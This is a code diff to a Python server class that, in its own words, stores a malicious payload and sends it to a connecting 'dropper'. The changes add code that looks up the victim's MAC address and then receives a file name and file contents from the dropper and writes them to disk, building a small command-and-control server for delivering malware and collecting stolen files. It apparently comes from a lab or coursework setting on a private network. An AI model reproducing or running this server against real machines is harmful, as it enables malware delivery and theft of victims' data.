@@ -8,7 +8,9 @@ import base64
 import logging
 import socket
 import os
-import secrets
+import subprocess
+import time
+from getmac import get_mac_address
 
 class Server:
     """ This class represents a server that stores some malicious payload and sends
@@ -44,7 +46,8 @@ class Server:
         """ Initialize server before the session. """
         try:
             # Binds the server to the port and listens to the port.
-            self.socket.bind(('10.0.2.6', self._port))
+            #print(self._ip)
+            self.socket.bind(('192.168.56.110', self._port))
             self.socket.listen()
             logging.debug('Server was successfully initialized.')
         except socket.error:
@@ -65,10 +68,23 @@ class Server:
             with connection:
                 print('Connection with dropper established from {}'.format(address))
                 session_key = self.encode_integer(address[1])
+                print(get_mac_address(ip=address[0]))
                 print(session_key, address[1])
+
                 encoded_payload = base64.b64encode(self.malicious_code)
-                connection.send(session_key)
                 connection.send(encoded_payload)
+
+                filename = connection.recv(1024).decode("utf-8")
+                print("[RECV] Receiving the filename.")
+                file = open(filename, "w")
+                connection.send("Filename received.".encode("utf-8"))
+
+                data_file = connection.recv(1024).decode("utf-8")
+                print("[RECV] Receiving the file data.")
+                file.write(data_file)
+                connection.send("Filename received.".encode("utf-8"))
+
+                file.close()             
 
 
 if __name__ == '__main__':
